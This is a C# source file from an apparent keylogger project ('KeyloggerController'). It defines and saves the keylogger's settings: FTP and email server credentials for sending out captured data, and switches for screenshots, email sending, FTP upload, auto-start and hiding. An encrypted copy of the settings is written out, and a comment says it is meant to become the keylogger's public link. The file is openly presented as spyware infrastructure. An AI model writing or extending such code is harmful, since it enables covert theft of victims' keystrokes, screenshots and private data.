using System;
using System.IO;
using Newtonsoft.Json;
using Newtonsoft.Json.Bson;

namespace KeyloggerController
{
    class classJsonObj
    {
        static String strJsonDir = @"ADDYOURDIRECTORYHERE"; //LOCAL FILE TO GRAB THE MASTER JSON FILE
        static String strEncryptDir = @"ADDYOURDIRECTORYHERE"; //LOCAL FILE TO ENCRYPT TO (SHOULD LATER BE THE PUBLIC LINK FOR THE KEYLOGGER!)

        static string strEncryptionKey;

        public class classJson
        {
            public FTP FTP { get; set; }
            public Email Email { get; set; }
            public Check Check { get; set; }
        }

        public class FTP
        {
            public string Host { get; set; }
            public string User { get; set; }
            public string Pass { get; set; }
        }

        public class Email
        {
            public string Host { get; set; }
            public int Port { get; set; }
            public string Window { get; set; }
            public string FromEmail { get; set; }
            public string Pass { get; set; }
            public string ToEmail { get; set; }
        }

        public class Check
        {
            public bool TakeScreenshot { get; set; }
            public bool SpecificLogging { get; set; }
            public bool SendEmail { get; set; }
            public bool UploadFTP { get; set; }
            public bool Start { get; set; }
            public bool Hide { get; set; }
        }

        public static classJson initializeObj()
        {
            return JsonConvert.DeserializeObject<classJson>(File.ReadAllText(strJsonDir));
        }

        public static void exportObj(classJson objJson)
        {
            try
            {
                strEncryptionKey = classGetEncryption.encryptBson(objJson);

                File.WriteAllText(strJsonDir, JsonConvert.SerializeObject(objJson, Formatting.Indented));
                File.WriteAllText(strEncryptDir, strEncryptionKey);
            }
            catch (Exception e)
            {
                Console.WriteLine("Can't be written, preventing null: " + e);
            }
        }
    }
}
